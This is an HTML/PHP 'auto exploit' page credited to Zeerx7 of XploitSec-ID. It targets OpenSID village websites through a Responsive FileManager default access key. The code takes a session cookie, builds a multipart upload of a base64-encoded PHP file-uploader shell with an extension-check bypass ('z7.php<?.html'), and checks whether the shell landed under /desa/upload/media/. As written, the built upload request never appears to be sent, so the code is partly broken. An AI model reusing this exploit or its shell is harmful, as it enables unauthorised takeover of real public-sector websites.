<html>
<head>
  <title>RFM Open SID Auto Exploit</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
<style>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background-color: black;
    background-size: cover;
    color: #ffffff;
    font-family: 'Ubuntu';
    font-size: 13px;
    width: 100%;
    padding: 0px;
    -moz-border-radius: 1px;
    -webkit-border-radius: 1px;
    border-radius: 1px;
}
li {
    display: inline;
    margin: 1px;
    padding: 1px;
    -moz-border-radius: 1px;
    -webkit-border-radius: 1px;
    border-radius: 1px;
}



a {
    padding: 1px;
    border: 1px solid darkred;
    color: red;
    text-decoration:
    none;color: red;
    font-size:14px;
}

a:hover {
    color: darkred;
    text-decoration: underline;
}

b {
    color: darkred;

}
input[type=text],input[type=submit] {
border:2px solid darkred;
background:transparent;
color:red;
font-weight:bold;
margin:px;
padding:5px
}
</style>
</head>
<br><br><br>
        <center>
        <li> <a href="https://zone-xsec.com">&nbsp;zone-xsec&nbsp;</a> </li>
        <li> <a href="https://github.com/404rgr">&nbsp;My Github&nbsp;</a> </li>
        <li> <a href="https://tools.zone-xsec.com">&nbsp;Online Tools&nbsp;</a> </li>

        </ul>
        </center><hr color=darkred>
<br><br><center>
<font face="tahoma" style="color:darkred;text-shadow:0px 1px 5px #000;font-size:25px"><strong>RFM Open SID Auto Exploit</strong></font>
<form method="post">
<input type="text" name="url" size="30" height="10" placeholder="http://target.desa.id" style="margin: 5px auto; padding-left: 5px;" required>
<input type="submit" name="d" value="Exploit">
</form>

<?php
// 
// Coded By Zeerx7 <> XploitSec-ID
// 28-06-2020
//
error_reporting(0);
function cookies($url)
{
    file_get_contents($url);
    $cookies = array();
    foreach ($http_response_header as $s)
    {
        if (preg_match('|^Set-Cookie:\s*([^=]+)=([^;]+);(.+)$|', $s, $parts)) $cookies[$parts[1]] = $parts[2];
    }
    //echo $cookies['PHPSESSID'];
    return $cookies['PHPSESSID'];
}

//e/1;
//error_reporting(0);
if ($_POST['url'])
{
    //echo 2;
    //$target = "http://tegalsari-widang.desa.id/";
    $uploader = base64_decode("PHRpdGxlPlBhdXNpIEdhbnMgV2FzIEhlcmUgOiApPC90aXRsZT48P3BocCBlY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJ1cGxvYWRlciIgaWQ9InVwbG9hZGVyIj4nO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT4nO2lmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICc8Yj5TaGVsbCBVcGxvYWRlZCAhIDopPGI+PGJyPjxicj4nOyB9ZWxzZSB7IGVjaG8gJzxiPk5vdCB1cGxvYWRlZCAhIDwvYj48YnI+PGJyPic7IH19Pz4="); // uploader by zeerx7
    $target = $_POST['url'];
    if(!preg_match("/^http:\/\/|^https:\/\//",$target)){
      $target = "http://".$target;
    }
    //echo $target;
    $bug1 = "/assets/filemanager/dialog.php?akey=GantiKunciDesa";
    $bug2 = "/assets/filemanager/upload.php";
    $bug3 = "/desa/upload/media/";
    $tar1 = $target . $bug2;

    $cookie = cookies($target . $bug1);
    define('MULTIPART_BOUNDARY', '--------------------------' . microtime(true));
    $header = 'Content-Type: multipart/form-data; boundary=' . MULTIPART_BOUNDARY . "\r\n" . "Cookie: PHPSESSID=$cookie\r\n";
    define('FORM_FIELD', 'file');
    $filename = "z7.txt";
    $extbypass = "z7.php<?.html";
    $exthasil = "z7.php";
    $file_contents = $uploader; //file_get_contents($filename);
    $content = "--" . MULTIPART_BOUNDARY . "\r\n" . "Content-Disposition: form-data; name=\"" . FORM_FIELD . "\"; filename=\"" . basename($filename) . "\"\r\n" . "Content-Type: application/zip\r\n\r\n" . $file_contents . "\r\n";
    $content .= "--" . MULTIPART_BOUNDARY . "\r\n" . "Content-Disposition: form-data; name=\"file\"\r\n\r\n" . "bar\r\n";
    $content .= "--" . MULTIPART_BOUNDARY . "--\r\n";
    $content = str_replace('z7.txt', $extbypass, $content); // bypass ext
    $context = stream_context_create(array(
        'http' => array(
            'method' => 'POST',
            'header' => $header,
            'content' => $content,
        )
    ));
    $finall = $target . $bug3 . $exthasil;
    $cek = file_get_contents($finall);
    if (preg_match("/Pausi Gans/", $cek))
    {
        echo "<br><h3>Berhasil<br>$finall";
    }
    else
    {
        echo "<h3>Gagal";
    }
    $ba = parse_url($target);
}else{
  print '<br><font face="tahoma" style="color:darkred;text-shadow:0px 1px 5px #000;font-size:18px"><strong>Coded by Zeerx7 {XploitSec-ID}</strong></font>';
}

?>
